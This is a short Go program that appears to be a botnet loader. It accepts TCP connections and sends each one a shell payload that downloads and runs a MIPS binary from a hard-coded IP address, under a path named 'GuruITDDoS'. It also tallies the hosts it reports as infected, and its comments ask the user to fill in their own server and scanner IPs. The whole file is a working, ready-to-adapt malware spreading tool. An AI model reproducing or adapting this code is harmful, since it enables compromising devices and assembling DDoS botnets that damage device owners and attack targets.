package main

import (
	"fmt"
	"net"
	"time"
)

// Change Server IP and bin name
var payload string = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.208.206.226/GuruITDDoS/RpcSecurity.mips; curl -O http://91.208.206.226/GuruITDDoS/RpcSecurity.mips;chmod +x RpcSecurity.mips;./RpcSecurity.mips p.mips"
var dirChange, statusAttempted, statusInfected, echoDropped, statusFailed int

func zeroByte(a []byte) {
	for i := range a {
		a[i] = 0
	}
}

func loaderThread(conn net.Conn) {
	defer conn.Close()
	buf := make([]byte, 512)
	conn.SetWriteDeadline(time.Now().Add(60 * time.Second))

	conn.Write([]byte(payload))

	statusAttempted++
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))

	for {
		le, err := conn.Read(buf)
		if err != nil || le <= 0 {
			break
		}

		fmt.Printf("infected (%s)\r\n", conn.RemoteAddr())
		statusInfected++
		break
	}

	zeroByte(buf)
	return
}

func main() {
	li, err := net.Listen("tcp", "0.0.0.0:2") // Change this to scanner IP
	if err != nil {
		return
	}

	var i int = 0
	go func() {
		for {
			fmt.Printf("%d's | Attempted %d | Infected %d\r\n", i, statusAttempted, statusInfected)
			time.Sleep(1 * time.Second)
			i++
		}
	}()

	for {
		conn, err := li.Accept()
		if err != nil {
			break
		}

		go loaderThread(conn)
	}

	for {
		time.Sleep(1 * time.Second)
	}
}
